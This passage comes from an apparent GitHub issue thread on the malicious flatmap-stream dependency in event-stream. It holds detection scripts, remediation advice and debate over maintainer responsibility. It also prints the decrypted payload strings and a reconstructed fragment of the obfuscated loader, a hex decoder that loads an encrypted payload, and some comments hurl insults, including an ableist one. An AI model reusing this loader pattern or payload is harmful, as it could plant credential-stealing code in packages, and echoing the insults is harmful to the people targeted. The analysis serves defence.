`npm ERR!     /home/rof/.npm/_logs/2018-11-27T05_41_26_253Z-debug.log`

Getting this error when doing `npm i`

Please help"
1755	Before this is locked include me in the screencap thanks.
1756	Dominic wasn't able to reply to this thread when he tried, so you can see his response here: https://gist.github.com/dominictarr/9fd9c1024c94592bc7268d36b8d83b3a
1757	"This is now included into [github-drama](https://github.com/nikolas/github-drama). 😅

nikolas/github-drama#75"
1758	https://nakamotoinstitute.org/trusted-third-parties/
1759	alarm bell
1760	The late version of **nodemon** had **flatmap-stream** inside it! version 1.14.11 doesnt fiy. THIS FIXED IT FOR ME I CAN NOW DEPLOY ON GCLOUD YAY
1761	Just wanted to say hi. Issue should be locked to contributors :)
1762	mom, look. no hands.
1763	Just want to cheer everybody up, and let's hope for the best this get resolved asap.
1764	I really would like to know what was in the payload. This is a critical information for everybody.
1765	"That's why we need key signing and blacklisting mechanism in EVERY single repository distribution platform, then whenever this same kind of shit happens, we could simply disallow the loading of such malicious module/code and get it into the attentions of upstream maintainers.

https://medium.com/redpoint/introducing-pkgsign-package-signing-and-verification-for-npm-5b833e0ec2d4"
1766	"Possible way to fix it in `nodemon`

```sh
npm uninstall nodemon
npm install --save-dev nodemon
```"
1767	"![36946312-e00316b8-1f99-11e8-9749-6133bd740119](https://user-images.githubusercontent.com/13268747/49066983-ad68b180-f25d-11e8-83d9-5a11de5b73a2.gif)
"
1768	https://hueniverse.com/how-to-use-open-source-and-shut-the-fuck-up-at-the-same-time-d933471d59de
1769	"
Wouldn't a fork have been sufficient? "
1770	It's high time someone writes a package audit (didn't want to use the word antivirus) tool 🙂
1771	"Just want to cheer everybody up, and let's hope for the best this get resolved asap.
I really would like to know what was in the payload. This is a critical information for everybody."
1772	"Quoting Chris Northwood: ""[The payload] was highly targeted towards a cryptocurrency wallet product to steal encryption keys for cryptocurrency wallets."""
1773	why not maintain a blacklist in github
1774	"For vue-cli 3 users, you may need to upgrade the installed `@vue/cli` package to fix the vulnerability.

```sh
$ npm ls flatmap-stream
...
-- @vue/cli@3.1.3
  `-- @vue/cli-ui@3.1.2
    `-- terminate@2.1.0
      `-- ps-tree@1.1.0
        `-- event-stream@3.3.6
          `-- flatmap-stream@0.1.2
```"
1775	"> > note: I no longer have publish rights to this module on npm.
> 
> ```shell
> npm owner ls event-stream
> 
> right9ctrl <right9ctrl@outlook.com>
> ```
> 
> Transfer publishing rights to the unknown dude, but keep the repo under your username. Well done, mate 👍

Maybe we shouldn't just blame dominic, everybody has the exhausted time."
1776	Maybe javascript developers in fact learn to code left-pad themself after this instead of `npm i left-pad` :)
1777	I was here
1778	I was here
1779	I was here
1780	I was here
1781	"> To know if your project is in danger, run:
> 
> ```
> npm ls event-stream flatmap-stream
> ```
> The bad actor has publishing rights to `event-stream` and `flatmap-stream` contains the malicious code (specifically `flatmap-stream@0.1.1`, but any future version can't be trusted).
> 
> Here is an example result from one of my projects:
> 
> ```
> [redacted]
> └─┬ npm-run-all@4.1.3
>   └─┬ ps-tree@1.1.0
>     └─┬ event-stream@3.3.6
>       └── flatmap-stream@0.1.2
> ```

Wrote a small bash script for checking all subfolders in a folder for this. Useful if you've got a lot of node projects (https://gist.github.com/Auronmatrix/7bb3c4ae1a0a01360aef4c5e7aec63f7)"
1782	Rather than pointing finger at @dominictarr, lets foucs on how to find a permanent solution. Maybe, the community can create a single organisation repo where all popular project can be parked for maintenance if they know longer want to maintain...
1783	Lets foucs on how to find a permanent solution rather than playing the pointing finger game at @dominictarr.
1784	Can we please lock this issue?
1785	In general the fastest solution is to track `node_modules/fastmap-stream` and add the files of the previous and clean release.
1786	"In general the fastest solution is to track `node_modules/fastmap-stream` and add the files of the previous and clean release.

> Wrote a small bash script for checking all subfolders in a folder for this. Useful if you've got a lot of node projects ([gist.github.com/Auronmatrix/7bb3c4ae1a0a01360aef4c5e7aec63f7](https://gist.github.com/Auronmatrix/7bb3c4ae1a0a01360aef4c5e7aec63f7))

Why not just grep? ;-)"
1787	"the npm package `flatmap-stream` returns now a **404**

https://www.npmjs.com/package/flatmap-stream"
1788	Grow up and look around, bad lazy shiz makes us cryptotards loose.
1789	Luckily I've no Bitcoins. Also GitHub is emailing people whose repositories might be affected.
1790	"For yarn users `yarn list --pattern=""event-stream|flatmap-stream""`"
1791	"the npm package `flatmap-stream` returns now a **404**

https://www.npmjs.com/package/flatmap-stream"
1792	"Building on @Auronmatrix' bash script, here is a PowerShell script for Windows users:

```powershell
Get-ChildItem -Filter ""package.json"" -Recurse |
Where-Object { $_.FullName -inotmatch ""node_modules\\"" } |
ForEach-Object { Set-Location $_.Directory.FullName; npm ls event-stream flatmap-stream --no-update-notifier }
```
https://gist.github.com/luchsamapparat/d69dce9da5ba7d28528d2799143f7fb2

However, it scans all directories that have a `package.json` without being a in a `node_modules` directory themselves instead of checking all directories containing a `.git` directory. The latter didn't work for non-Git projects or those which do not have their `package.json` in the root directory.

Probably not the most-performant solution, but it works ;-)"
1793	"@tbodt Thank you for the clean code you post.

I'm not familiar with Javascript/Node.js, and I wandering, according to cross-domain policy,  the browser will block these malicious requests? If the code is running in the browser environment. 
"
1794	"Not sure if Skantek would have helped here: https://twitter.com/pmarquees/status/1035497062614401024

https://medium.com/adyen/skantek-securing-nodejs-at-adyen-f944283ce7c9"
1795	"![gif image 571 x 326 pixels](https://user-images.githubusercontent.com/45387591/49073742-03703180-f22b-11e8-950f-b1c15be68a7d.gif)
"
1796	"What's wrong with these Zuckerberg children who don't think they have a moral responsibility to fix the ill effects their technology causes people?

Shameful and embarrassingly autistic. 

@dominictarr never start an OSS repo again. "
1797	"> I'm not familiar with Javascript/Node.js, and I wandering, according to cross-domain policy, the browser will block these malicious requests? If the code is running in the browser environment.

It only runs in Node.js context."
1798	@jchapple may I suggest an alternative: stop using OpenSource. At the same time, I'll thanks @dominictarr for publishing this code that helped so many developers.
1799	Do I need to change my browser to avoid this virus?
1800	@jsloverperson no
1801	"> @sroze I just hate geeks who take no responsibility for their fuckups which are ABSOLUTELY theirs to own.

You’re free to request a full refund of the $0 you paid for using other people’s work.
"
1802	"The main problem here is that because the repo wasnt moved or publicly defined as archived you might have gotten the impression that it was @dominictarr that was maintaining the Repo. That said its not on him to tell you that wasnt the case. However by not doing it ""his"" project now has a bad reputation (as if anyone would give a...) giving him bad reputation (again give...) in the end even though he shouldnt have."
1803	"> > @sroze I just hate geeks who take no responsibility for their fuckups which are ABSOLUTELY theirs to own.
> 
> You’re free to request a full refund of the $0 you paid for using other people’s work.

@claui $0? Electric bills can now be paid in crypto? "
1804	When did the OSS community become so toxic that people feel entitled to the point of publicly lynching a maintainer, someone who's worked so many hours for them **for free** like this? Regardless of whether we think his behaviour was careless, let's be a little bit more constructive, everyone.
1805	"@jchapple Please take some responsibility yourself and stop unnecessarily targeting a mental health issue. https://www.autism.org.uk/

_(Update: if this seems out of context, the original post I was referencing has now been deleted.)_"
1806	"why would I request a refund for a library I've never used?

The issue didn't affect me.

I'm just here to call out twats who think it's cool to let a project they
had responsibility over become infected, thus infecting others, and pretend
like they have done nothing wrong.

Whoopee doo that you've made some shit library that benefited some noobs.
That doesn't make it ok to infect people with shitware and then do a Zuck
like it's not your responsibility. It literally. Fucking. Is.

On Tue, 27 Nov 2018 at 10:14, Claudia <notifications@github.com> wrote:

> @sroze <https://github.com/sroze> I just hate geeks who take no
> responsibility for their fuckups which are ABSOLUTELY theirs to own.
>
> You’re free to request a full refund of the $0 you paid for using other
> people’s work.
>
> —
> You are receiving this because you were mentioned.
> Reply to this email directly, view it on GitHub
> <https://github.com/dominictarr/event-stream/issues/116#issuecomment-442003373>,
> or mute the thread
> <https://github.com/notifications/unsubscribe-auth/AE6j0vPJQb_4GREN7LKqyaiPedIy9vZ-ks5uzRCegaJpZM4Yr9Fh>
> .
>
"
1807	"Regardless of the incident and the carelessness of the maintainer, it is always a good practice to actually read and understand what OSS package is doing, before actually using it yourself. 

It is your responsibility (both with your project and your customers) to make sure the code you use is clean, don't use OSS code as a mean of copy and paste.

Thanks @dominictarr for your work! "
1808	"> I'm just here to call out twats

@jchapple This is where I stopped reading."
1809	"This is an interesting thread and a wake up call (to me) about using other peoples code. I'm eternally grateful for the hours of other peoples work I've benefited from, but it's always up to me to make sure the code I'm using is not malicious (very much guilty of not really doing this).

Out of interest would there ever be good reason to have/need encrypted code in an open source library? Not that I went digging in to the code myself, but that seems questionable straight away."
1810	"Please find here an excerpt from the MIT Licence under which this project lives:

> THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND"
1811	"Please find here an excerpt from the MIT Licence under which this project lives:

> THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND"
1812	"@jchapple Did you ever think there is a [LICENCE AGREEMENT](https://github.com/dominictarr/event-stream/blob/master/LICENCE) included with each package?
```
THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, 
EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES 
OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. 
IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR 
ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, 
TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE 
SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
```"
1813	"Predictable.

On Tue, 27 Nov 2018 at 10:28, Claudia <notifications@github.com> wrote:

> I'm just here to call out twats
>
> @jchapple <https://github.com/jchapple> This is where I stopped reading.
>
> —
> You are receiving this because you were mentioned.
> Reply to this email directly, view it on GitHub
> <https://github.com/dominictarr/event-stream/issues/116#issuecomment-442007818>,
> or mute the thread
> <https://github.com/notifications/unsubscribe-auth/AE6j0iVSDd7WeDfmeiqRqPCjopE-jAztks5uzRPOgaJpZM4Yr9Fh>
> .
>
"
1814	"I'm not making any legal claims. My claims are personal and moral.

Don't give a shit about warranties.

Do give a shit about irresponsible Zuckerberg geeks thinking they're above
moral judgement for their catastrophic choices.

On Tue, 27 Nov 2018 at 10:28, Daniil Kolesnik <notifications@github.com>
wrote:

> @jchapple <https://github.com/jchapple> Did you ever think there is a LICENCE
> AGREEMENT
> <https://github.com/dominictarr/event-stream/blob/master/LICENCE>
> included with each package?
>
> THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND,
> EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
> OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
> IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR
> ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
> TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
> SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
>
> —
> You are receiving this because you were mentioned.
> Reply to this email directly, view it on GitHub
> <https://github.com/dominictarr/event-stream/issues/116#issuecomment-442007975>,
> or mute the thread
> <https://github.com/notifications/unsubscribe-auth/AE6j0sezbU0OUTpw3TKxeDHGXqrNMv3fks5uzRPrgaJpZM4Yr9Fh>
> .
>
"
1815	LOL :rofl: 
1816	"@jchapple 
> My claims are personal and moral.

My moral claims are going to persons who used this (or any other) package for years and never mind to support it or at least make a little contribution. The era of moral claims to people who share their work for free started when people as you came to OSS. If you want to change something, start from yourself, just go and fix some bug or start to maintain some package instead of writing this bs comments

For those who are ready to help you can start here:
[List of dependents of event-stream](https://www.npmjs.com/browse/depended/event-stream)"
1817	"No, son. The world is changing as regular good folk are wising up to the
irresponsible Zuckerberg fuckery that's plaguing the world.

Entitled brat geeks who think they're exempt from judgement for causing ill
effects like these, beware, you'll soon be an extinct type.

And before anyone says I'm the one being entitled again, I'd like to point
out again I literally didn't use this library and rarely use open source. I
contribute more than I do consume. So find a proper argument against me
thanks. !!

On Tue, 27 Nov 2018 at 10:37, Daniil Kolesnik <notifications@github.com>
wrote:

> @jchapple <https://github.com/jchapple>
>
> My claims are personal and moral.
>
> My moral claims are going to persons who used this (or any other) package
> for years and never mind to support it or at least make a little
> contribution. The era of moral claims to people who share their work for
> free started when people as you came to OSS. If you want to change
> something, start from yourself, just go and fix some bug or start to
> maintain some package instead of writing this bs comments
>
> —
> You are receiving this because you were mentioned.
> Reply to this email directly, view it on GitHub
> <https://github.com/dominictarr/event-stream/issues/116#issuecomment-442010450>,
> or mute the thread
> <https://github.com/notifications/unsubscribe-auth/AE6j0rTHZm56A8nxhCV6MXlmM0d1RNBhks5uzRXagaJpZM4Yr9Fh>
> .
>
"
1818	@jchapple cease.
1819	"Decrypting it results in the following:

```
[ '75d4c87f3f69e0fa292969072c49dff4f90f44c1385d8eb60dae4cc3a229e52cf61f78b0822353b4304e323ad563bc22c98421eb6a8c1917e30277f716452ee8d57f9838e00f0c4e4ebd7818653f00e72888a4031676d8e2a80ca3cb00a7396ae3d140135d97c6db00cab172cbf9a92d0b9fb0f73ff2ee4d38c7f6f4b30990f2c97ef39ae6ac6c828f5892dd8457ab530a519cd236ebd51e1703bcfca8f9441c2664903af7e527c420d9263f4af58ccb5843187aa0da1cbb4b6aedfd1bdc6faf32f38a885628612660af8630597969125c917dfc512c53453c96c143a2a058ba91bc37e265b44c5874e594caaf53961c82904a95f1dd33b94e4dd1d00e9878f66dafc55fa6f2f77ec7e7e8fe28e4f959eab4707557b263ec74b2764033cd343199eeb6140a6284cb009a09b143dce784c2cd40dc320777deea6fbdf183f787fa7dd3ce2139999343b488a4f5bcf3743eecf0d30928727025ff3549808f7f711c9f7614148cf43c8aa7ce9b3fcc1cff4bb0df75cb2021d0f4afe5784fa80fed245ee3f0911762fffbc36951a78457b94629f067c1f12927cdf97699656f4a2c4429f1279c4ebacde10fa7a6f5c44b14bc88322a3f06bb0847f0456e630888e5b6c3f2b8f8489cd6bc082c8063eb03dd665badaf2a020f1448f3ae268c8d176e1d80cc756dc3fa02204e7a2f74b9da97f95644792ee87f1471b4c0d735589fc58b5c98fb21c8a8db551b90ce60d88e3f756cc6c8c4094aeaa12b149463a612ea5ea5425e43f223eb8071d7b991cfdf4ed59a96ccbe5bdb373d8febd00f8c7effa57f06116d850c2d9892582724b3585f1d71de83d54797a0bfceeb4670982232800a9b695d824a7ada3d41e568ecaa6629',
  'db67fdbfc39c249c6f338194555a41928413b792ff41855e27752e227ba81571483c631bc659563d071bf39277ac3316bd2e1fd865d5ba0be0bbbef3080eb5f6dfdf43b4a678685aa65f30128f8f36633f05285af182be8efe34a2a8f6c9c6663d4af8414baaccd490d6e577b6b57bf7f4d9de5c71ee6bbffd70015a768218a991e1719b5428354d10449f41bac70e5afb1a3e03a52b89a19d4cc333e43b677f4ec750bf0be23fb50f235dd6019058fbc3077c01d013142d9018b076698536d2536b7a1a6a48f5485871f7dc487419e862b1a7493d840f14e8070c8eff54da8013fd3fe103db2ecebc121f82919efb697c2c47f79516708def7accd883d980d5618efd408c0fd46fd387911d1e72e16cf8842c5fe3477e4b46aa7bb34e3cf9caddfca744b6a21b5457beaccff83fa6fb6e8f3876e4764e0d4b5318e7f3eed34af757eb240615591d5369d4ab1493c8a9c366dfa3981b92405e5ebcbfd5dca2c6f9b8e8890a4635254e1bc26d2f7a986e29fef6e67f9a55b6faec78d54eb08cb2f8ea785713b2ffd694e7562cf2b06d38a0f97d0b546b9a121620b7f9d9ccca51b5e74df4bdd82d2a5e336a1d6452912650cc2e8ffc41bd7aa17ab17f60b2bd0cfc0c35ed82c71c0662980f1242c4523fae7a85ccd5e821fe239bfb33d38df78099fd34f429d75117e39b888344d57290b21732f267c22681e4f640bec9437b756d3002a3135564f1c5947cc7c96e1370db7af6db24c9030fb216d0ac1d9b2ca17cb3b3d5955ffcc3237973685a2c078e10bc6e36717b1324022c8840b9a755cffdef6a4d1880a4b6072fd1eb7aabebb9b949e1e37be6dfb6437c3fd0e6f135bcea65e2a06eb35ff26dcf2b2772f8d0cde8e5fa5eec577e9754f6b044502f8ce8838d36827bd3fe91cccba2a04c3ee90c133352cbad34951fdf21a671a4e3940fd69cfee172df4123a0f678154871afa80f763d78df971a1317200d0ce5304b3f01ace921ea8afb41ec800ab834d81740353101408733fb710e99657554c50a4a8cb0a51477a07d6870b681cdc0be0600d912a0c711dc9442260265d50e269f02eb49da509592e0996d02a36a0ce040fff7bd3be57e97d07e4de0cdb93b7e3ccea422a5a526fb95ea8508ea2a40010f56d4aa96da23e6e9bcbae09dacccdcd8ac6af96a1922266c3795fb0798affaa75b8ae05221612ce45c824d1f6603fe2afd74b9e167736bfffe01a12b9f85912572a291336c693f133efeac881cd09207505ad93967e3b7a8972cdcce208bfa3b9956370795791ca91a8b9deabde26c3ee2adb43e9f7df2df16d4582a4e610b73754e609b1eea936a4d916bf5ed9d627692bcc8ed0933026e9250d16bdaf2b68470608aeaffedcf2be8c4c176bfc620e3f9f17a4a9d8ef9fe46cca41a79878d37423c0fa9f3ee1f4e6d68f029d6cbb5cbc90e7243135e0fc1dd66297d32adabc9a6d0235709be173b688ba2004f518f58f5459caca60d615ae4dc0d0eeacbe48ca8727a8b42dc78396316a0e223029b76311e7607ea5bd236307ba3b62afeff7a1ef5c0b5d7ee760c0f6472359c57817c5d9cd534d9a34bb4847bbc83c37b14b6444e9f386f1bec4b42c65d1078d54bd007ff545028205099abc454919406408b761a1636d10e39ede9f650f25abad3219b9d46d535402b930488535d97d19be3b0e75fed31d0b2f8af099481685e2b4fa9bff05cbac1b9b405db2c7eae68501633e02723560727a1c8c34c32afc76cdeb82fe8bae34b09cd82402076b9f481d043b080d851c7b6ba8613adba3bc3d5edb9a84fce41130ad328fe4c062a76966cb60c4fa801f359d22b70a797a2c2a3d19da7383025cb2e076b9c30b862456ae4b60197101e82133748c224a1431545fde146d98723ccb79b47155b218914c76f5d52027c06c6c913450fc56527a34c3fe1349f38018a55910de819add6204ab2829668ca0b7afb0d00f00c873a3f18daad9ae662b09c775cddbe98b9e7a43f1f8318665027636d1de18b5a77f548e9ede3b73e3777c44ec962fb7a94c56d8b34c1da603b3fc250799aad48cc007263daf8969dbe9f8ade2ac66f5b66657d8b56050ff14d8f759dd2c7c0411d92157531cfc3ac9c981e327fd6b140fb2abf994fa91aecc2c4fef5f210f52d487f117873df6e847769c06db7f8642cd2426b6ce00d6218413fdbba5bbbebc4e94bffdef6985a0e800132fe5821e62f2c1d79ddb5656bd5102176d33d79cf4560453ca7fd3d3c3be0190ae356efaaf5e2892f0d80c437eade2d28698148e72fbe17f1fac993a1314052345b701d65bb0ea3710145df687bb17182cd3ad6c121afef20bf02e0100fd63cbbf498321795372398c983eb31f184fa1adbb24759e395def34e1a726c3604591b67928da6c6a8c5f96808edfc7990a585411ffe633bae6a3ed6c132b1547237cab6f3b24c57d3d4cd8e2fbbd9f7674ececf0f66b39c2591330acc1ac20732a98e9b61a3fd979f88ab7211acbf629fcb0c80fb5ed1ea55df0735dcf13510304652763a5ed7bde3e5ebda1bf72110789ebefa469b70f6b4add29ce1471fa6972df108717100412c804efcf8aaba277f0107b1c51f15f144ab02dd8f334d5b48caf24a4492979fa425c4c25c4d213408ecfeb82f34e7d20f26f65fa4e89db57582d6a928914ee6fc0c6cc0a9793aa032883ea5a2d2135dbfcf762f4a2e22585966be376d30fbfabb1dfd182e7b174097481763c04f5d7cbd060c5a36dc0e3dd235de1669f3db8747d5b74d8c1cc9ab3a919e257fb7e6809f15ab7c2506437ced02f03416a1240a555f842a11cde514c450a2f8536f25c60bbe0e1b013d8dd407e4cb171216e30835af7ca0d9e3ff33451c6236704b814c800ecc6833a0e66cd2c487862172bc8a1acb7786ddc4e05ba4e41ada15e0d6334a8bf51373722c26b96bbe4d704386469752d2cda5ca73f7399ff0df165abb720810a4dc19f76ca748a34cb3d0f9b0d800d7657f702284c6e818080d4d9c6fff481f76fb7a7c5d513eae7aa84484822f98a183e192f71ea4e53a45415ddb03039549b18bc6e1',
  '63727970746f',
  '656e76',
  '6e706d5f7061636b6167655f6465736372697074696f6e',
  '616573323536',
  '6372656174654465636970686572',
  '5f636f6d70696c65',
  '686578',
  '75746638' ]
```"
1820	"@jchapple 
Earlier in this thread, from @dominictarr :
> @limonte I tried to transfer it to @right9ctrl but github errored because they already had a fork of it at http://github.com/right9ctrl/event-stream

From what I understand, @dominictarr may have wished for someone else (potentially @right9ctrl) to take over this package already before the malicious code being discovered.
This probably isn't about not taking responsibility, there simply hasn't been a great many commits in the past few years and he might have been looking for someone to maintain it for some time."
1821	"> You’re free to request a full refund of the $0 you paid for using other people’s work.

Reacting to this comment wasn't enough. I had to quote it and say that I love it."
1822	"> Out of interest would there ever be good reason to have/need encrypted code in an open source library? Not that I went digging in to the code myself, but that seems questionable straight away.

@ct14it No, never. It's open source code. Even if it's from a corporation with some patented/licensed code that shouldn't be exposed, the practice is to have the parts of code which can be open sourced in the repo and have a separate build licensed differently.

> Decrypting it results in the following...

@hughpearse Thanks a lot but it's taken care of. Check out ""What does it do"" here: https://github.com/dominictarr/event-stream/issues/116#issue-382854428

"
1823	@mpourismaiel Thank you, thought as much!
1824	"Maybe this all was a ruse from @dominictarr to get someone to pay attention to this package! (if so, well played).

In regards to helping fix the list of deps, anyone have any preference? "
1825	"> their catastrophic choices

Like including untrusted code --that doesn't provide a nice legal warranty-- into their codebase?

Oh!"
1826	"What I don't understand, how come there are no automatic red flags/or permissions when a deep dependency attempts to write on desk or make network calls?
I mean in theory, is it correct to say that any npm package could have a payload that would hijack the machine or override other system functions, where is the security in any of that? how can this be improved, can someone elaborate more on that?"
1827	"> What I don't understand, how come there are no automatic red flags/or permissions when a deep dependency attempts to write on desk or make network calls?

Because this is perfectly normal behavior for many libraries."
1828	"I would like to just add that there is zero liability here when someone provides code under MIT and someone else uses it. However packaging and distributing a ""product"" is another matter - one where  **Negligence** may well come into play. "
1829	"@aliogaili I wish NPM packages could have a permission system, the way iOS and Android have one.
Having to specify in the `package.json` that you're going to have read access to an internet connection, or read/write access to the filesystem."
1830	"@aliogaili 
There is a bunch of cases when a dependency should do I/O calls:
```
[my-package]
└─┬ jest-environment-jsdom@22.4.3
  └─┬ jsdom@11.7.0
    └── request@2.85.0
```

Managing all of these cases would be too hard and time-consuming"
1831	It seems the whole npm stack is false. Any pakcage can be injected!
1832	"There's no one to blame on an open source repository, but the ones who decided to use It.
"
1833	"> > @limonte I tried to transfer it to @right9ctrl but github errored because they already had a fork of it at [http://github.com/right9ctrl/event-stream](https://github.com/right9ctrl/event-stream)
> > If you guys feel strongly about this, why don't you volunteer to maintain it and contact npm support?
> 
> Because this is your f*ck-up, so you fix it? :/

It's not really their f*ck up though, there's no obligation for someone to fix this for anyone. If there's any f*ck up it's people blindly assuming that someone else is looking out for you. If you use an open source project it's YOUR responsibility to make sure it does what you want in a responsible way."
1834	"> is it correct to say that any npm package could have a payload that would hijack the machine or override other system functions, where is the security in any of that? how can this be improved, can someone elaborate more on that?

I'm by no means an authority in infosec, but I'll give you my 2 cents.

I think we should have a system of permissions for npm packages, just like we have for apps on Android. No package would have access to any network function unless explicitly allowed by the person installing it.

This wouldn't solve 100% of the problems, but would mitigate a lot imho. If all your package does is wrapping a try-catch block you won't be doing any http request in my machine!
"
1835	@ihavenonickname There's currently no solid way I can think to actually achieve this though as anything can modify the prototype chain. Every case I can think of can be worked around by a dependency
1836	@ihavenonickname There's currently no solid way I can think to actually achieve this though as anything can modify the prototype chain. Every case I can think of can be worked around by a dependency
1837	"Update nodemon to ``nodemon@^1.18.7``
Travis build now passed"
1838	"Update nodemon to ``nodemon@^1.18.7``
Travis build now passed"
1839	"@samv Vendoring is a generally problematic practice, for a number of pragmatic reasons (including eg. native modules being compiled for different architectures), and it likely would not have solved the problem here, since the malware was well-disguised and would probably have passed cursory human review.

More broadly, there's a need for proper dependency review tooling, as I remarked in [an earlier comment](https://github.com/dominictarr/event-stream/issues/116#issuecomment-441782943). That doesn't require vendoring."
1840	"@alex-deas 

Yes, it probably requires support from the node.js runtime, it's not something we could achieve only on npm's side.

If I'm not mistaken deno.js (https://github.com/denoland/deno) is a js runtime designed with these security features in mind -- and by the same guy who created node.js btw.
"
1841	"For runtime security, a more viable option than naive sandboxing (which still leaves open *many* attack vectors) is something based on object capabilities. I just learned of https://github.com/agoric/ses, which seems to be trying to do that.

More about the concept of object capabilities in general (and why they are a good solution) is explained [here](http://joeduffyblog.com/2015/11/10/objects-as-secure-capabilities/)."
1842	"> For runtime security, a more viable option than naive sandboxing (which still leaves open _many_ attack vectors) is something based on object capabilities. I just learned of https://github.com/agoric/ses, which seems to be trying to do that.
> 
> More about the concept of object capabilities in general (and why they are a good solution) is explained [here](http://joeduffyblog.com/2015/11/10/objects-as-secure-capabilities/).

Looks very interesting. Btw, I've sent the original payloads to all AV vendors, the first started flagging it."
1843	@dominictarr can we get the dates please of when the control of the module was transferred? This may help people (end users of apps built with this dependency) figure out if they possibly are affected. 
1844	"> **EDIT 26/11/2018**:
> 
>     * **Am I affected?**:
>       If you are using anything crypto-currency related, then maybe. As discovered by @maths22, the target seems to have been identified as copay related libraries. It only executes successfully when a matching package is in use (assumed to be copay at this point). If you are using a crypto-currency related library and if you see `flatmap-stream@0.1.1` after running `npm ls event-stream flatmap-stream`, you are most likely affected. For example:
>       ```
>       $ npm ls event-stream flatmap-stream
>       ...
>       flatmap-stream@0.1.1
>       ...
>       ```
> 
>     * **What does it do**:
>       Other users have done some good analysis of what these payloads actually do.
>       
>       * [#116 (comment)](https://github.com/dominictarr/event-stream/issues/116#issuecomment-441759047)
>       * [#116 (comment)](https://github.com/dominictarr/event-stream/issues/116#issuecomment-441746370)
>       * [#116 (comment)](https://github.com/dominictarr/event-stream/issues/116#issuecomment-441749105)
> 
>     * **What can I do**:
>       By this time fixes are being deployed and npm has yanked the malicious version. Ensure that the developer(s) of the package you are using are aware of this post. If you are a developer update your event-stream dependency to `event-stream@3.3.4`. **This protects people with cached versions of event-stream**.
> 
> 
> @dominictarr Why was @right9ctrl given access to this repo? He added [flatmap-stream](https://github.com/hugeglass/flatmap-stream) which is entirely (1 commit to the repo but has 3 versions, the latest one removes the injection, unmaintained, created 3 months ago) an injection targeting [ps-tree](https://github.com/indexzero/ps-tree). After he adds it at almost the exact same time the injection is added to `flatmap-stream`, he bumps the version and publishes. Literally the second commit (3 days later) after that he removes the injection and bumps a major version so he can clear the repo of having `flatmap-stream` but still have everyone (millions of weekly installs) using 3.x affected.
> 
> @right9ctrl If you removed flatmap-stream because your realized it was an injection attack why didn't you yank `event-stream@3.3.6` from npm and put a PSA? If you didn't know, why did you choose to use a completely unused/unknown library (0 downloads on npm until you use it)? If I had the exact date from npm in which `flatmap-stream@0.1.1` was published I wouldn't be asking you questions.
> 
> I've included a break down of what I have so far on `flatmap-stream` below. It includes the portion of code not found in the **unminified** source of `flatmap-stream@0.1.1` but found in the **minified** source. The code has been cleaned up a little to get a better understanding.
> 
> The worst part is I still don't even know what this does... The decrypted data n[0] is byte code or something, not regular javascript, or maybe I'm just not handling it correctly.
> 
> ```js
> // var r = require, t = process;
> 
> // function e(r) {
> //     return Buffer.from(r, ""hex"").toString()
> // }
> function decode(data) {
>     return Buffer.from(data, ""hex"").toString()
> }
> 
> // var n = r(e(""2e2f746573742f64617461"")),
> // var n = require(decode(""2e2f746573742f64617461""))
> // var n = require('./test/data')
> var n = [""75d4c87f3f69e0fa292969072c49dff4f90f44c1385d8eb60dae4cc3a229e52cf61f78b0822353b4304e323ad563bc22c98421eb6a8c1917e30277f716452ee8d57f9838e00f0c4e4ebd7818653f00e72888a4031676d8e2a80ca3cb00a7396ae3d140135d97c6db00cab172cbf9a92d0b9fb0f73ff2ee4d38c7f6f4b30990f2c97ef39ae6ac6c828f5892dd8457ab530a519cd236ebd51e1703bcfca8f9441c2664903af7e527c420d9263f4af58ccb5843187aa0da1cbb4b6aedfd1bdc6faf32f38a885628612660af8630597969125c917dfc512c53453c96c143a2a058ba91bc37e265b44c5874e594caaf53961c82904a95f1dd33b94e4dd1d00e9878f66dafc55fa6f2f77ec7e7e8fe28e4f959eab4707557b263ec74b2764033cd343199eeb6140a6284cb009a09b143dce784c2cd40dc320777deea6fbdf183f787fa7dd3ce2139999343b488a4f5bcf3743eecf0d30928727025ff3549808f7f711c9f7614148cf43c8aa7ce9b3fcc1cff4bb0df75cb2021d0f4afe5784fa80fed245ee3f0911762fffbc36951a78457b94629f067c1f12927cdf97699656f4a2c4429f1279c4ebacde10fa7a6f5c44b14bc88322a3f06bb0847f0456e630888e5b6c3f2b8f8489cd6bc082c8063eb03dd665badaf2a020f1448f3ae268c8d176e1d80cc756dc3fa02204e7a2f74b9da97f95644792ee87f1471b4c0d735589fc58b5c98fb21c8a8db551b90ce60d88e3f756cc6c8c4094aeaa12b149463a612ea5ea5425e43f223eb8071d7b991cfdf4ed59a96ccbe5bdb373d8febd00f8c7effa57f06116d850c2d9892582724b3585f1d71de83d54797a0bfceeb4670982232800a9b695d824a7ada3d41e568ecaa6629"",""db67fdbfc39c249c6f338194555a41928413b792ff41855e27752e227ba81571483c631bc659563d071bf39277ac3316bd2e1fd865d5ba0be0bbbef3080eb5f6dfdf43b4a678685aa65f30128f8f36633f05285af182be8efe34a2a8f6c9c6663d4af8414baaccd490d6e577b6b57bf7f4d9de5c71ee6bbffd70015a768218a991e1719b5428354d10449f41bac70e5afb1a3e03a52b89a19d4cc333e43b677f4ec750bf0be23fb50f235dd6019058fbc3077c01d013142d9018b076698536d2536b7a1a6a48f5485871f7dc487419e862b1a7493d840f14e8070c8eff54da8013fd3fe103db2